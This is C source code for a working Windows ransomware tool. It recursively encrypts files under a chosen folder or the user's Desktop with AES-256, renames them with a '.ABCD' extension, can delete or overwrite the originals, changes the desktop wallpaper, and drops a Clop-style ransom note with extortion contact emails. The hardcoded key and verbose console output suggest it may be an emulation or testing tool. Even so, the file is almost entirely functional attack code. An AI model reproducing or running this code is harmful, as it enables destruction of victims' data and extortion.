#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

#define CRYPTO_EXT ".ABCD"
#define CRYPTO_EXT_LEN 5


#define KEY_LEN 32
#define MAX_FILEPATH_LEN 256

#define ENCRYPTION_MODE 1
#define DECRYPTION_MODE 0
#define UNDEFINED_MODE -1
int mode = -1; // 1 - encrypt, 0 - decrypt, -1 - undefined
int seq = 0;

int crypt(HANDLE hInpFile, HANDLE hOutFile, int file_pointer_offset) {
	CHAR key[KEY_LEN];
	for (int i = 0; i < KEY_LEN; i++) {
		key[i] = i;
	}

	DWORD error_id = 0;
	wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
	HCRYPTPROV hProv;
	if (!CryptAcquireContextW(&hProv, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		error_id = GetLastError();
		printf("Error in CryptAcquireContextW: %x\n", error_id);
		CryptReleaseContext(hProv, 0);
		return false;
	}


	HCRYPTHASH hHash;
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		error_id = GetLastError();
		printf("Error in CryptCreateHash: %x\n", error_id);
		CryptReleaseContext(hProv, 0);
		return false;
	}

	if (!CryptHashData(hHash, (BYTE*)key, KEY_LEN, 0)) {
		error_id = GetLastError();
		printf("Error in CryptHashData: %x\n", error_id);
		CryptReleaseContext(hProv, 0);
		return false;
	}

	HCRYPTKEY hKey;
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		error_id = GetLastError();
		printf("Error in CryptDeriveKey: %x\n", error_id);
		CryptReleaseContext(hProv, 0);
		return false;
	}

	const int chunk_size = 256;
	BYTE pbData[chunk_size] = { 0 };
	DWORD out_len = 0;
	BOOL result = FALSE;
	BOOL final_block = FALSE;

	DWORD in_file_size = GetFileSize(hInpFile, NULL);
	DWORD written = 0;
	LARGE_INTEGER  ReadCurrentPosition;
	LARGE_INTEGER  WriteCurrentPosition;

	//ReadCurrentPosition.QuadPart = file_pointer_offset;
	//SetFilePointerEx(hInpFile, ReadCurrentPosition, &ReadCurrentPosition, FILE_CURRENT);
	//if (ReadCurrentPosition.QuadPart == in_file_size) {
	//	final_block = TRUE;
	//}
	//printf("in_file_size: %d\n", in_file_size);

	while (result = ReadFile(hInpFile, pbData, chunk_size, &out_len, NULL)) {
		//printf("out_len: %d\n", out_len);
		if ((0 == out_len) || (final_block == TRUE)) {
			break;
		}

		ReadCurrentPosition.QuadPart = 0;
		SetFilePointerEx(hInpFile, ReadCurrentPosition, &ReadCurrentPosition, FILE_CURRENT);
		if (ReadCurrentPosition.QuadPart == in_file_size) {
			final_block = TRUE;
		}
		//printf("ReadCurrentPosition.QuadPart: %d\n", ReadCurrentPosition.QuadPart);

		WriteCurrentPosition.QuadPart = 0;
		SetFilePointerEx(hOutFile, WriteCurrentPosition, &WriteCurrentPosition, FILE_CURRENT);
		//printf("WriteCurrentPosition.QuadPart: %d\n", WriteCurrentPosition.QuadPart);


		WriteCurrentPosition.QuadPart = ReadCurrentPosition.QuadPart - WriteCurrentPosition.QuadPart - out_len;
		//printf("Move WriteCurrentPosition.QuadPart: %d\n", WriteCurrentPosition.QuadPart);
		SetFilePointerEx(hOutFile, WriteCurrentPosition, &WriteCurrentPosition, FILE_CURRENT);
		//printf("WriteCurrentPosition.QuadPart: %d\n", WriteCurrentPosition.QuadPart);
		
		if (ReadCurrentPosition.QuadPart > file_pointer_offset) {

			if (mode == ENCRYPTION_MODE) {
				if (!CryptEncrypt(hKey, NULL, final_block, 0, pbData, &out_len, chunk_size)) {
					error_id = GetLastError();
					printf("Error in CryptEncrypt: %x\n", error_id);
					break;
				}
			}
			else {
				if (!CryptDecrypt(hKey, NULL, final_block, 0, pbData, &out_len)) {
					error_id = GetLastError();
					printf("Error in CryptDecrypt: %x\n", error_id);
					break;
				}
			}
		}

		
		if (!WriteFile(hOutFile, pbData, out_len, &written, NULL)) {
			error_id = GetLastError();
			printf("Error in WriteFile: %x\n", error_id);
			break;
		}
		memset(pbData, 0, chunk_size);
	}
	CryptReleaseContext(hProv, 0);
	CryptDestroyKey(hKey);
	CryptDestroyHash(hHash);

	//Zeroing out keys
	memset(key, 0, sizeof(key));
}


int file_io(char* in_file)
{
	char* out_file;
	char* ext = strrchr(in_file, '.');
	char* out_file_ext;

	if (mode == -1)
		mode = strcmp(ext, CRYPTO_EXT) & 1;

	else if (mode != (strcmp(ext, CRYPTO_EXT) & 1))
		return -1;
	if (mode) {
		out_file = (char*)malloc(strlen(in_file) + CRYPTO_EXT_LEN + 1);
		strcpy(out_file, in_file);
		strcat(out_file, CRYPTO_EXT);
	} else {
		out_file = _strdup(in_file);
		out_file_ext = strrchr(out_file, '.');
		*out_file_ext = '\0';
	}
	//printf("in_file: %s\n", in_file);

	HANDLE hInpFile;
	HANDLE hOutFile;
	/*
		Seq 0: two files
	*/
	if (seq == 0) {
		hInpFile = CreateFileA(in_file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN | FILE_FLAG_DELETE_ON_CLOSE, NULL);
		if (hInpFile == INVALID_HANDLE_VALUE) {
			printf("Input file cannot be opened\n");
			return false;
		}
		hOutFile = CreateFileA(out_file, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hOutFile == INVALID_HANDLE_VALUE) {
			printf("Output file cannot be opened\n");
			return false;
		}
		crypt(hInpFile, hOutFile, 4096);
		CloseHandle(hInpFile);
		CloseHandle(hOutFile);
	}
	/*
		Seq 1: overwrite file
	*/
	if (seq == 1) {
		hInpFile = CreateFileA(in_file, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
		if (hInpFile == INVALID_HANDLE_VALUE) {
			printf("Input file cannot be opened\n");
			return false;
		}
		crypt(hInpFile, hInpFile, 4096);
		CloseHandle(hInpFile);
	}
	/*
		Seq 2: two files and memset 0
	*/
	if (seq == 2) {
		hInpFile = CreateFileA(in_file, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
		if (hInpFile == INVALID_HANDLE_VALUE) {
			printf("Input file cannot be opened\n");
			return false;
		}
		hOutFile = CreateFileA(out_file, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hOutFile == INVALID_HANDLE_VALUE) {
			printf("Output file cannot be opened\n");
			return false;
		}
		crypt(hInpFile, hOutFile, 4096);
		crypt(hInpFile, hInpFile, 4096);
		CloseHandle(hInpFile);
		CloseHandle(hOutFile);
	}
	

	free(out_file);

	//Deleting original file
	//if (!DeleteFileA(in_file))
	//	printf("ERROR: couldn't delete %s\n", in_file);
	return true;
}


void files_tree(const char* folder) {

	char wildcard[MAX_PATH];
	sprintf(wildcard, "%s\\*", folder);
	printf("Folder: %s\n", folder);

	WIN32_FIND_DATAA fd;
	HANDLE handle = FindFirstFileA(wildcard, &fd);

	if (handle == INVALID_HANDLE_VALUE) return;

	do {

		if (strcmp((const char*)fd.cFileName, ".") == 0 || strcmp((const char*)fd.cFileName, "..") == 0)
			continue;

		char path[MAX_PATH];
		sprintf(path, "%s\\%s", folder, fd.cFileName);
		printf("File: %s\n", path);

		if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && !(fd.dwFileAttributes & (FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_DEVICE)))
			files_tree(path);

		if (fd.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE)
			file_io(path);

	} while (FindNextFileA(handle, &fd));

	FindClose(handle);
}

BOOL DirectoryExists(LPCSTR szPath)
{
	DWORD dwAttrib = GetFileAttributesA(szPath);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

/*
int main() {
	CHAR ori_file[MAX_FILEPATH_LEN] = "C:/Users/hank_k_chen/Desktop/test.txt";
	CHAR enc_file[MAX_FILEPATH_LEN] = "C:/Users/hank_k_chen/Desktop/test2.txt";
	mode = DECRYPTION_MODE;
	crypt(enc_file, ori_file);

	return 0;
}
*/
char RansomNote[] = 
"Your network has been penetrated. \n\
All files on each host in the network have been encrypted with a strong algorithm.\n\
Backups were either encrypted or deleted or backup disks were formatted.\n\
Shadow copies also removed, so F8 or any other methods may damage encrypted data but not recover.\n\
We exclusively have decryption software for your situation\n\
No decryption software is available in the public.\n\
DO NOT RESET OR SHUTDOWN – files may be damaged.\n\
DO NOT RENAME OR MOVE the encryptedand readme files.\n\
DO NOT DELETE readme files.\n\
This may lead to the impossibility of recovery of the certain files.\n\
Photorec, RannohDecryptor etc.repair tools are uselessand can destroy your files irreversibly.\n\
If you want to restore your files write to emails(contacts are at the bottom of the sheet) and attach 2 - 3 encrypted files\n\
(Less than 5 Mb each, non - archived and your files should not contain valuable information\n\
(Databases, backups, large excel sheets, etc.)).\n\
You will receive decrypted samples and our conditions how to get the decoder.\n\
\n\
Attention!!!\n\
Your warranty - decrypted samples.\n\
Do not rename encrypted files.\n\
Do not try to decrypt your data using third party software.\n\
We don`t need your filesand your information.\n\
\n\
But after 2 weeks all your files and keys will be deleted automatically.\n\
Contact emails :\n\
servicedigilogos@protonmail.com\n\
or\n\
managersmaers@tutanota.com\n\
\n\
The final price depends on how fast you write to us.\n\
\n\
Clop";

int DropNote(char* filepath) {
	DWORD written = 0;
	HANDLE hFile = CreateFileA(filepath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("file cannot be opened\n");
		return false;
	}
	if (!WriteFile(hFile, RansomNote, sizeof(RansomNote), &written, NULL)) {
		printf("Error in WriteFile: %x\n", GetLastError());
	}
	CloseHandle(hFile);
}

int main(int argc, char* argv[]) {
	if (argc < 4) {
		printf("[-] Usage: tool.exe <mode> <folder>");
		return -1;
	}
	printf("[+] argument - mode: %s \n", argv[1]);
	printf("[+] argument - file I/O sequence: %s \n", argv[2]);
	printf("[+] argument - folder: %s \n", argv[3]);
	mode = atoi(argv[1]);
	seq = atoi(argv[2]);

	if (argv[4]) {
		bool status = SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)argv[4], SPIF_UPDATEINIFILE);
	}

	if (argv[5]) {
		DropNote(argv[5]);
	}

	char* path = { 0x0 };
	int path_len = 0;
	if (DirectoryExists(argv[3])) {
		path = (char*)malloc(strlen(argv[3]) + 1);
		strcpy(path, argv[3]);
	}
	else {
		char* home_path = getenv("USERPROFILE");
		const char* folder_desktop = "\\Desktop";
		path = (char*)malloc(strlen(home_path) + strlen(folder_desktop) + 1);
		strcpy(path, home_path);
		strcat(path, folder_desktop);
	}
	printf("[+] Target Folder: %s\n", path);
	files_tree(path);

	free(path);


	return 0;
}
